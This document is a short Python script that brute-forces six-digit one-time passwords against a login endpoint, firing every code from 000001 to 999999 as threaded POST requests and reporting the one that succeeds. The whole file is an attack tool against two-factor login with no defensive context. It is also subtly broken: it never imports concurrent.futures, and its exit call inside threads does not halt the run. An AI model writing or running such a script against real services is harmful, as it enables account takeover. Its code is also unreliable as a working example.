import urllib3

# Set the URL and the payload (data to send in the request)
url = "http://www.example.com/login"
payload = {"otp": ""}

# Create an in-memory cache to store the results of successful login attempts
cache = {}

# Function to try logging in with a single OTP
def try_login(otp):
    # Check the cache to see if the OTP has already been tried
    if otp in cache:
        return
    # Set the OTP in the payload
    payload["otp"] = otp
    # Create a connection pool and send the POST request with the payload
    http = urllib3.PoolManager()
    response = http.request("POST", url, fields=payload)
    # Check the response status code
    if response.status == 200:
        print("Successful login with OTP:", otp)
        exit(0)
    else:
        print("Failed login with OTP:", otp)
    # Update the cache
    cache[otp] = True

# Try each OTP in the range from 000001 to 999999 using multiple threads
with concurrent.futures.ThreadPoolExecutor() as executor:
    for i in range(1, 1000000):
        # Format the OTP as a 6-digit string (e.g. 000001, 000002, etc.)
        otp = "{:06d}".format(i)
        # Submit the task to the executor
        future = executor.submit(try_login, otp)

print("Finished trying all OTPs")
